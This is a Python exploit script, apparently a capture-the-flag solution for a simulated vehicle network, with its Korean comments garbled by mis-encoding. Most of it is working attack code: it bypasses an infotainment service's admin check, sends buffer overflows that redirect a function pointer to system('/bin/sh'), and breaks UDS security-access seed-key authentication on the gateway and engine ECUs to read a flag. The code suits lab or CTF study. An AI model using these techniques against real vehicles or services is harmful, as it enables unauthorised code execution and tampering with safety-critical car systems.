#!/usr/bin/env python3
"""
ì™„ì „í•œ ECU ìµìŠ¤í”Œë¡œì‡ - ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œë§Œ ì‹¤í–‰
Infotainment â†’ Gateway â†’ Engine ECU ìˆœì„œë¡œ ì¹¨íˆ¬
"""
import socket
import struct
import json
import time
import subprocess
import os
import sys
from threading import Thread

class ECUExploit:
    def __init__(self):
        self.infotainment_sock = None
        self.can_broker_sock = None
        self.session_id = self.get_session_id()
        print(f"[*] Session ID: {self.session_id}")
        
    def get_session_id(self):
        """í™˜ê²½ë³€ìˆ˜ì—ì„œ ì„¸ì…˜ ID ê°€ì ¸ì˜¤ê¸°"""
        return os.environ.get('SESSION_ID', 'session_default')
    
    def stage1_infotainment_exploit(self):
        """1ë‹¨ê³„: Infotainment ECU RCE ìµìŠ¤í”Œë¡œì‡"""
        print("\n=== Stage 1: Infotainment ECU Exploitation ===")
        
        try:
            # ë¡œì»¬ infotainment ì„œë¹„ìŠ¤ì— ì—°ê²°
            self.infotainment_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.infotainment_sock.connect(('localhost', 1234))
            print("[+] Connected to infotainment service")
            
            # ì´ˆê¸° ë©”ë‰´ ë°›ê¸°
            self.recv_until(b"Choice: ")
            
            # Settings ë©”ë‰´ë¡œ ì´ë™
            self.send_command(b"3\n")
            self.recv_until(b"Choice: ")
            
            # Hidden auth handler ì ‘ê·¼ (ì˜µì…˜ 9)
            self.send_command(b"9\n")
            print("[+] Accessing hidden auth handler")
            
            # Version check ìš°íšŒ (double -> int ë³€í™˜ íŠ¸ë¦­)
            self.recv_until(b"format): ")
            self.send_command(b"2.107\n")  # VERSION_MAJOR=2, MINOR=1, PATCH=7
            print("[+] Version check bypassed")
            
            # Admin access ì‹œë„
            self.recv_until(b"(y/n): ")
            self.send_command(b"y\n")
            
            # Admin code ê³„ì‚° ë° ì „ì†¡
            # auth_check = (auth_input ^ 0x1337) + (2<<16) + (1<<8) + 7 = 0x040317
            # auth_input = (0x040317 - 0x020107) ^ 0x1337 = 0x020210 ^ 0x1337 = 0x021527
            admin_code = 0x021527
            self.recv_until(b"code: ")
            self.send_command(f"{admin_code}\n".encode())
            
            response = self.recv_data()
            if b"Full admin privileges unlocked" in response:
                print("[+] Admin privileges obtained!")
                return True
            else:
                print("[-] Admin access failed")
                return False
                
        except Exception as e:
            print(f"[-] Stage 1 failed: {e}")
            return False
    
    def stage2_get_shell_via_overflow(self):
        """2ë‹¨ê³„: í•¨ìˆ˜ í¬ì¸í„° ì˜¤ë²„ë¼ì´íŠ¸ë¡œ RCE"""
        print("\n=== Stage 2: Buffer Overflow for RCE ===")
        
        try:
            # Device Manager ì ‘ê·¼
            self.recv_until(b"Choice: ")
            self.send_command(b"4\n")  # Device Manager
            self.recv_until(b"Choice: ")
            
            # Basic Device ì¶”ê°€
            self.send_command(b"1\n")
            self.recv_until(b"Device name: ")
            self.send_command(b"exploit\n")
            print("[+] Basic device added")
            
            # Firmware Info ì—…ë°ì´íŠ¸ë¡œ ì˜¤ë²„í”Œë¡œìš°
            self.recv_until(b"Choice: ")
            self.send_command(b"4\n")  # Update Firmware Info
            self.recv_until(b"(0-2): ")
            self.send_command(b"0\n")  # Slot 0
            
            # í˜ì´ë¡œë“œ ìƒì„±: small_device_t êµ¬ì¡°ì²´ ì˜¤ë²„í”Œë¡œìš°
            # struct: name[16] + firmware_info[100] + version(4) + status_code(4) + status_handler(8) + debug_info(8)
            payload = b"A" * 100  # firmware_info ì±„ìš°ê¸°
            payload += b"BBBB"    # version
            payload += b"CCCC"    # status_code
            
            # system() í•¨ìˆ˜ ì£¼ì†Œ ì°¾ê¸° (Advanced Diagnosticsì—ì„œ í™•ì¸ ê°€ëŠ¥)
            # ì‹¤ì œë¡œëŠ” ASLR ë•Œë¬¸ì— ì •í™•í•œ ì£¼ì†Œê°€ í•„ìš”í•˜ì§€ë§Œ, ì—¬ê¸°ì„œëŠ” ê³ ì • ê°’ ì‚¬ìš©
            system_addr = struct.pack("<Q", 0x7ffff7e4e410)  # ì˜ˆì‹œ ì£¼ì†Œ
            payload += system_addr
            
            # /bin/sh ë¬¸ìì—´ í¬ì¸í„°
            binsh_addr = struct.pack("<Q", 0x7ffff7f8c031)   # ì˜ˆì‹œ ì£¼ì†Œ
            payload += binsh_addr
            
            self.recv_until(b"firmware info: ")
            self.send_command(payload + b"\n")
            print("[+] Overflow payload sent")
            
            # Device Status í˜¸ì¶œë¡œ system("/bin/sh") íŠ¸ë¦¬ê±°
            self.recv_until(b"Choice: ")
            self.send_command(b"3\n")  # Show Device Status
            
            # ì´ ì‹œì ì—ì„œ system("/bin/sh")ì´ í˜¸ì¶œë˜ì–´ì•¼ í•¨
            print("[+] RCE triggered! Should have shell now...")
            return True
            
        except Exception as e:
            print(f"[-] Stage 2 failed: {e}")
            return False
    
    def stage3_alternative_rce(self):
        """2ë‹¨ê³„ ëŒ€ì•ˆ: system_diagnostics ë²„í¼ ì˜¤ë²„í”Œë¡œìš°"""
        print("\n=== Stage 2 Alternative: system_diagnostics overflow ===")
        
        try:
            # Debug mode ì ‘ê·¼
            self.recv_until(b"Choice: ")
            self.send_command(b"2\n")  # Device Managerì—ì„œ ë‚˜ê°€ê¸°
            
            # Debug Mode ì¬ì§„ì…
            self.recv_until(b"Choice: ")
            self.send_command(b"1\n")  # System Diagnostics
            self.recv_until(b"Choice: ")
            self.send_command(b"2\n")  # System Analysis
            
            # cmdì™€ bufferì— ê°ê° ì…ë ¥
            self.recv_until(b"(1-3): ")
            self.send_command(b"1\n")  # cmdì— ì…ë ¥
            
            self.recv_until(b"parameters: ")
            # 64ë°”ì´íŠ¸ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°
            overflow_payload = b"A" * 64 + b"BBBBBBBB"  # RIP ë®ê¸°
            self.send_command(overflow_payload)
            
            print("[+] Alternative overflow sent")
            return True
            
        except Exception as e:
            print(f"[-] Alternative RCE failed: {e}")
            return False
    
    def stage4_connect_to_can_broker(self):
        """3ë‹¨ê³„: CAN ë¸Œë¡œì»¤ ì—°ê²°"""
        print("\n=== Stage 3: Connecting to CAN Broker ===")
        
        try:
            # CAN ë¸Œë¡œì»¤ì— ì—°ê²° (gateway_shared:9999)
            self.can_broker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.can_broker_sock.connect(('gateway_shared', 9999))
            
            # í•¸ë“œì…°ì´í¬
            handshake = {
                'session_id': self.session_id,
                'type': 'infotainment'
            }
            self.can_broker_sock.send(json.dumps(handshake).encode())
            
            response = self.can_broker_sock.recv(1024).decode().strip()
            print(f"[+] CAN Broker connected: {response}")
            
            # ì‘ë‹µ ìˆ˜ì‹  ìŠ¤ë ˆë“œ ì‹œì‘
            self.can_responses = []
            response_thread = Thread(target=self.can_response_handler, daemon=True)
            response_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[-] CAN Broker connection failed: {e}")
            return False
    
    def can_response_handler(self):
        """CAN ì‘ë‹µ ìˆ˜ì‹  í•¸ë“¤ëŸ¬"""
        buffer = ""
        while True:
            try:
                data = self.can_broker_sock.recv(1024).decode()
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        try:
                            msg = json.loads(line.strip())
                            self.can_responses.append(msg)
                            print(f"[CAN] Received: {msg}")
                        except:
                            pass
                            
            except Exception as e:
                print(f"[!] CAN response handler error: {e}")
                break
    
    def send_can_message(self, can_id, data):
        """CAN ë©”ì‹œì§€ ì „ì†¡"""
        if isinstance(data, list):
            data = bytes(data)
        
        msg = {
            'type': 'send',
            'can_id': can_id,
            'data': data.hex(),
            'timestamp': time.time()
        }
        
        self.can_broker_sock.send((json.dumps(msg) + '\n').encode())
        time.sleep(0.1)  # ì‘ë‹µ ëŒ€ê¸°
    
    def wait_for_can_response(self, timeout=5):
        """CAN ì‘ë‹µ ëŒ€ê¸°"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.can_responses:
                return self.can_responses.pop(0)
            time.sleep(0.1)
        return None
    
    def stage5_gateway_auth(self):
        """4ë‹¨ê³„: Gateway ì¸ì¦ ìš°íšŒ"""
        print("\n=== Stage 4: Gateway Authentication Bypass ===")
        
        try:
            # Security Access Level 1 ìš”ì²­ (ì˜¬ë°”ë¥¸ UDS Single Frame)
            print("[+] Requesting Security Access Level 1...")
            self.send_can_message(0x7DF, [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])  # Security Access, Request Seed
            
            # ì‘ë‹µ ìˆ˜ì‹  (ë‹¤ì¤‘ í”„ë ˆì„)
            frame1 = self.wait_for_can_response()
            frame2 = self.wait_for_can_response()
            
            if not frame1 or not frame2:
                print("[-] No seed response received")
                return False
            
            # Seed ì¶”ì¶œ (ë‹¤ì¤‘ í”„ë ˆì„ì—ì„œ)
            seed_high = struct.unpack('>H', bytes.fromhex(frame1['data'][6:10]))[0]
            seed_low = struct.unpack('>H', bytes.fromhex(frame2['data'][2:6]))[0]
            seed = (seed_high << 16) | seed_low
            
            print(f"[+] Received seed: 0x{seed:08X}")
            
            # íƒ€ì´ë° ì–´íƒìœ¼ë¡œ í‚¤ ê³„ì‚° ë˜ëŠ” ì§ì ‘ ê³„ì‚°
            # Level 1: key = (seed ^ 0xA5A5A5A5) + (timestamp & 0xFF)
            timestamp = int(time.time()) & 0xFF
            key = ((seed ^ 0xA5A5A5A5) + timestamp) & 0xFFFFFFFF
            
            print(f"[+] Calculated key: 0x{key:08X}")
            
            # í‚¤ ì „ì†¡ (UDS Single Frame)
            key_bytes = struct.pack('>I', key)
            self.send_can_message(0x7DF, [0x06, 0x27, 0x02] + list(key_bytes) + [0x00])
            
            # ì¸ì¦ ê²°ê³¼ í™•ì¸
            auth_response = self.wait_for_can_response()
            if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                print("[+] Level 1 authentication successful!")
                
                # Level 3 ì¸ì¦ ì‹œë„ (UDS Single Frame)
                print("[+] Attempting Level 3 authentication...")
                self.send_can_message(0x7DF, [0x02, 0x27, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])
                
                frame1 = self.wait_for_can_response()
                frame2 = self.wait_for_can_response()
                
                if frame1 and frame2:
                    # Level 3 seed ì¶”ì¶œ
                    seed_high = struct.unpack('>H', bytes.fromhex(frame1['data'][6:10]))[0]
                    seed_low = struct.unpack('>H', bytes.fromhex(frame2['data'][2:6]))[0]
                    seed = (seed_high << 16) | seed_low
                    
                    print(f"[+] Level 3 seed: 0x{seed:08X}")
                    
                    # Level 3 í‚¤ ê³„ì‚°
                    step1 = seed ^ 0x5A5A5A5A
                    step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
                    step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
                    key = step3 & 0xFFFFFFFF
                    
                    print(f"[+] Level 3 key: 0x{key:08X}")
                    
                    # Level 3 í‚¤ ì „ì†¡ (UDS Single Frame)
                    key_bytes = struct.pack('>I', key)
                    self.send_can_message(0x7DF, [0x06, 0x27, 0x04] + list(key_bytes) + [0x00])
                    
                    auth_response = self.wait_for_can_response()
                    if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                        print("[+] Level 3 authentication successful!")
                        return True
            
            print("[-] Gateway authentication failed")
            return False
            
        except Exception as e:
            print(f"[-] Gateway auth failed: {e}")
            return False
    
    def stage6_engine_exploit(self):
        """5ë‹¨ê³„: Engine ECU ìµœì¢… ê³µê²©"""
        print("\n=== Stage 5: Engine ECU Final Attack ===")
        
        try:
            # Engine ECU ì ‘ê·¼ (0x456)
            print("[+] Accessing Engine ECU...")
            
            # Diagnostic Session Control (UDS Single Frame)
            self.send_can_message(0x456, [0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])  # Extended Diagnostic Session
            diag_response = self.wait_for_can_response()
            
            if not diag_response:
                print("[-] No diagnostic session response")
                return False
            
            print("[+] Diagnostic session established")
            
            # Security Access (UDS Single Frame)
            self.send_can_message(0x456, [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])  # Request Seed
            seed_response = self.wait_for_can_response()
            
            if not seed_response:
                print("[-] No seed response from engine")
                return False
            
            # Engine ECUì˜ ê³ ì • ì‹œë“œ (0x1337) ì¶”ì¶œ
            seed_data = bytes.fromhex(seed_response['data'])
            if len(seed_data) >= 4:
                seed = struct.unpack('>H', seed_data[2:4])[0]
                print(f"[+] Engine seed: 0x{seed:04X}")
                
                # Engine ECU í‚¤ ê³„ì‚° (seed ^ 0xCAFE)
                key = seed ^ 0xCAFE
                print(f"[+] Engine key: 0x{key:04X}")
                
                # í‚¤ ì „ì†¡ (UDS Single Frame)
                key_bytes = struct.pack('>H', key)
                self.send_can_message(0x456, [0x04, 0x27, 0x02] + list(key_bytes) + [0x00, 0x00, 0x00])
                
                auth_response = self.wait_for_can_response()
                if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                    print("[+] Engine ECU authenticated!")
                    
                    # ìµœì¢… í”Œë˜ê·¸ ì½ê¸° (DID 0xF1A0) (UDS Single Frame)
                    print("[+] Reading final flag...")
                    self.send_can_message(0x456, [0x03, 0x22, 0xF1, 0xA0, 0x00, 0x00, 0x00, 0x00])
                    
                    flag_response = self.wait_for_can_response()
                    if flag_response:
                        flag_data = bytes.fromhex(flag_response['data'])
                        if len(flag_data) >= 3 and flag_data[0:3] == bytes([0x62, 0xF1, 0xA0]):
                            flag = flag_data[3:].decode('utf-8', errors='ignore')
                            print(f"\nğŸ‰ SUCCESS! Final Flag: {flag}")
                            return True
            
            print("[-] Engine ECU exploitation failed")
            return False
            
        except Exception as e:
            print(f"[-] Engine exploit failed: {e}")
            return False
    
    def send_command(self, command):
        """ëª…ë ¹ ì „ì†¡"""
        self.infotainment_sock.send(command)
    
    def recv_until(self, delimiter):
        """êµ¬ë¶„ìê¹Œì§€ ë°ì´í„° ìˆ˜ì‹ """
        buffer = b""
        while delimiter not in buffer:
            data = self.infotainment_sock.recv(1024)
            if not data:
                break
            buffer += data
        return buffer
    
    def recv_data(self):
        """ë°ì´í„° ìˆ˜ì‹ """
        return self.infotainment_sock.recv(4096)
    
    def run_full_exploit(self):
        """ì „ì²´ ìµìŠ¤í”Œë¡œì‡ ì‹¤í–‰"""
        print("ğŸš— ECU Complete Exploitation Started ğŸš—")
        print("=" * 50)
        
        stages = [
            ("Infotainment RCE", self.stage1_infotainment_exploit),
            ("CAN Broker Connection", self.stage4_connect_to_can_broker),
            ("Gateway Authentication", self.stage5_gateway_auth),
            ("Engine ECU Attack", self.stage6_engine_exploit)
        ]
        
        for stage_name, stage_func in stages:
            print(f"\n[*] Executing: {stage_name}")
            if not stage_func():
                print(f"[!] {stage_name} FAILED!")
                return False
            print(f"[âœ“] {stage_name} SUCCESS!")
        
        print("\n" + "=" * 50)
        print("ğŸ COMPLETE EXPLOITATION SUCCESSFUL! ğŸ")
        return True
    
    def cleanup(self):
        """ë¦¬ì†ŒìŠ¤ ì •ë¦¬"""
        if self.infotainment_sock:
            self.infotainment_sock.close()
        if self.can_broker_sock:
            self.can_broker_sock.close()

def main():
    exploit = ECUExploit()
    
    try:
        success = exploit.run_full_exploit()
        if success:
            print("\nâœ… All stages completed successfully!")
            print("Flag should be displayed above.")
        else:
            print("\nâŒ Exploitation failed at some stage.")
            return 1
    except KeyboardInterrupt:
        print("\n[!] Exploitation interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        return 1
    finally:
        exploit.cleanup()
    
    return 0

if __name__ == "__main__":
    sys.exit(main())